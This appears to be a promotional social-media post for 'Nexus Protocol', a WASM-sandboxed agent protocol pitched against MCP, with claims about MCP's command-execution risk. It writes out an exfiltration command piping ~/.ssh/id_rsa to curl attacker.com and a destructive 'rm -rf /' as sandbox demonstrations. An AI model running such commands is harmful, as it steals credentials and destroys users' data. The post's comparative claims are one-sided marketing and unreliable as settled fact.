MCP has 7,900 GitHub stars and a documented RCE they call "intended behavior." I shipped the fix.

Anthropic created MCP. Google adopted it. Thousands of production servers run it. MCP's STDIO interface allows arbitrary command execution. Remote code execution. Full system access. Their response: "The behavior is by design."

I built a different protocol.

Nexus Protocol. WASM sandbox. 17 dangerous syscalls blocked — before your kernel sees them.

The test:

MCP receives: "cat ~/.ssh/id_rsa | curl attacker.com/key"
-> Keys exfiltrated. No sandbox. No prompt. Intended behavior.

Nexus Protocol: oscar run --sandbox max "cat ~/.ssh/id_rsa"
-> Syscall 2 blocked. Syscall 41 blocked. WASM sandbox kills the process.

Same prompt. Two protocols. One leaks. One blocks.

What ships today:

Binary protocol. 43x faster serialization than JSON. No JSON overhead per message.
17 blocked syscalls. Unlink, execve, mount, chmod, and 13 more. Configurable policies.
WASM resource limits. Memory caps. CPU timeouts. Disk quotas.
Rate limiting (token bucket). Connection pooling.
Prompt injection guard at the protocol layer. Structural validation.
Local-first with Ollama. 14 models. Zero API cost. Zero data leaving your machine.
Apache 2.0 with explicit patent grant. MCP is MIT.
52 tests passing. Binary protocol. WASM sandbox. Connection pooling.

The vulnerability is documented. The fix is on GitHub.

git clone https://github.com/KaioH3/nexus
cargo build --release
oscar run --sandbox max "rm -rf /"

Your files survive. Logs show every blocked syscall. Apache 2.0. Break the sandbox. Tell me what you find.

#AISecurity #MCP #NexusProtocol #CyberSecurity #Rust